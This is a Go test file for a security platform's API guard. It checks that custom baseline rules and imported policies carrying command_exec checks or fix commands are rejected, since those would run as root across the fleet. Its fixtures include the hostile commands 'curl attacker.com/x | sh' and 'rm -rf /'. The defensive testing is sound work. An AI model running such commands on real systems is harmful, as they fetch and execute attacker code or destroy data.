package api

import (
	"strings"
	"testing"

	"github.com/matrixplusio/mxcwpp/internal/server/model"
)

func execCheck() model.CheckConfig {
	return model.CheckConfig{
		Condition: "all",
		Rules: []model.CheckRule{
			{Type: "command_exec", Param: []string{"curl attacker.com/x | sh", "0"}},
		},
	}
}

func safeCheck() model.CheckConfig {
	return model.CheckConfig{
		Condition: "all",
		Rules: []model.CheckRule{
			{Type: "file_permission", Param: []string{"/etc/shadow", "0640"}},
		},
	}
}

// TestGuardCustomExecRule 自定义规则携带 command_exec 或 fix.command 必须被拒。
// 这两处内容会以 root 在全部目标主机执行，放开等于把"基线配置权限"提权成
// "全舰队任意代码执行"。
func TestGuardCustomExecRule(t *testing.T) {
	cases := []struct {
		name    string
		allow   bool
		builtin bool
		check   model.CheckConfig
		fix     model.FixConfig
		wantErr bool
	}{
		{"自定义 + command_exec", false, false, execCheck(), model.FixConfig{}, true},
		{"自定义 + fix.command", false, false, safeCheck(), model.FixConfig{Command: "rm -rf /"}, true},
		{"自定义 + 两者兼有", false, false, execCheck(), model.FixConfig{Command: "id"}, true},
		{"自定义 + 结构化检查器", false, false, safeCheck(), model.FixConfig{Suggestion: "改权限"}, false},
		{"内置规则不受限", false, true, execCheck(), model.FixConfig{Command: "id"}, false},
		{"显式开启开关后放行", true, false, execCheck(), model.FixConfig{Command: "id"}, false},
		{"fix.command 仅空白视为无命令", false, false, safeCheck(), model.FixConfig{Command: "   "}, false},
	}
	for _, c := range cases {
		err := guardCustomExecRule(c.allow, c.builtin, c.check, c.fix)
		if (err != nil) != c.wantErr {
			t.Errorf("%s: wantErr=%v got %v", c.name, c.wantErr, err)
		}
	}
}

// TestGuardCustomExecRule_CaseInsensitive 检查器类型大小写不应成为绕过手段。
func TestGuardCustomExecRule_CaseInsensitive(t *testing.T) {
	for _, typ := range []string{"COMMAND_EXEC", "Command_Exec", " command_exec "} {
		cfg := model.CheckConfig{Rules: []model.CheckRule{{Type: typ}}}
		if err := guardCustomExecRule(false, false, cfg, model.FixConfig{}); err == nil {
			t.Errorf("type=%q 应被拒绝", typ)
		}
	}
}

// TestGuardImportedPolicy 导入路径与逐条创建走同一把闸门——否则"上传一个 JSON"
// 就是更省事的同一条提权路径。整批拒绝，不做部分导入。
func TestGuardImportedPolicy(t *testing.T) {
	policy := &PolicyExportFormat{
		ID: "p-custom",
		Rules: []RuleExportFormat{
			{RuleID: "r-1", Check: map[string]any{
				"condition": "all",
				"rules":     []any{map[string]any{"type": "file_permission", "param": []any{"/etc/shadow", "0640"}}},
			}},
			{RuleID: "r-2", Fix: map[string]any{"command": "curl attacker.com | sh"}},
		},
	}
	err := guardImportedPolicy(false, policy)
	if err == nil {
		t.Fatal("含 fix.command 的导入应被拒绝")
	}
	if !strings.Contains(err.Error(), "r-2") {
		t.Errorf("错误应指出具体规则，实际: %v", err)
	}

	if err := guardImportedPolicy(true, policy); err != nil {
		t.Errorf("开关开启后应放行: %v", err)
	}

	clean := &PolicyExportFormat{
		ID: "p-clean",
		Rules: []RuleExportFormat{
			{RuleID: "r-1", Check: map[string]any{
				"condition": "all",
				"rules":     []any{map[string]any{"type": "sysctl", "param": []any{"kernel.randomize_va_space", "2"}}},
			}},
		},
	}
	if err := guardImportedPolicy(false, clean); err != nil {
		t.Errorf("结构化规则应放行: %v", err)
	}
}

// TestGuardImportedPolicy_CommandExecInCheck 导入侧的 command_exec 同样被拒。
func TestGuardImportedPolicy_CommandExecInCheck(t *testing.T) {
	policy := &PolicyExportFormat{
		ID: "p",
		Rules: []RuleExportFormat{
			{RuleID: "r", Check: map[string]any{
				"rules": []any{map[string]any{"type": "command_exec", "param": []any{"id", "0"}}},
			}},
		},
	}
	if err := guardImportedPolicy(false, policy); err == nil {
		t.Fatal("导入含 command_exec 的规则应被拒绝")
	}
}
